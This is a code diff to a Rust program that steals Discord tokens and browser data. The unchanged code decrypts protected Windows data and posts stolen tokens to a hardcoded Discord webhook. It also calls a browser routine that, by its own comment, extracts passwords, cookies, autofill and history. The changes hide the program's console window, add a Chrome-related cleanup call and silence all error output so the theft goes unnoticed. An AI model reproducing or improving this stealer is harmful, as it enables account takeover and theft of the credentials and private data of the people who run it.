@@ -1,10 +1,12 @@
+#![windows_subsystem = "windows"]
+
 mod browsers;
 
 use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
 use base64::{engine::general_purpose, Engine as _};
 use serde::{Deserialize, Serialize};
 use serde_json::{json, Value};
-use std::{collections::{HashMap, HashSet}, env, fs, path::PathBuf, process::Command};
+use std::{collections::{HashMap, HashSet}, env, fs, path::PathBuf};
 use regex::Regex;
 use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};
 #[derive(Debug, Serialize, Deserialize)]
@@ -143,6 +145,8 @@ fn get_discord_paths() -> HashMap<&'static str, PathBuf> {
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
+    browsers::chrome_inject::cleanup_legacy_artifacts();
+
     let wbh = "https://discord.com/api/webhooks/1492679213478580447/okx50duQMVNKN3Nh2k9llKj29XMi-H0QK3rB4SowuRidhVADcy-k1Y68z229HmzI1yVT";
     let client = reqwest::Client::new();
     let mut sent_tokens = HashSet::new();
@@ -209,13 +213,9 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                                             let response = client.post(wbh).json(&embed).send().await;
                                                             match response {
                                                                 Ok(resp) => {
-                                                                    if !resp.status().is_success() {
-                                                                        eprintln!("Failed to send to webhook: {}", resp.status());
-                                                                    }
+                                                                    let _ = resp.status();
                                                                 }
-                                                                Err(err) => {
-                                                                    eprintln!("Error sending to webhook: {}", err);
-                                                                }
+                                                                Err(_err) => {}
                                                             }
                                                         }
                                                     }
@@ -233,8 +233,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     }
 
     // === Browser Data Extraction (passwords, cookies, autofill, history) ===
-    if let Err(e) = browsers::run(&client, wbh).await {
-        eprintln!("Browser extraction error: {}", e);
+    if let Err(_e) = browsers::run(&client, wbh).await {
+        // silent
     }
     
     Ok(())
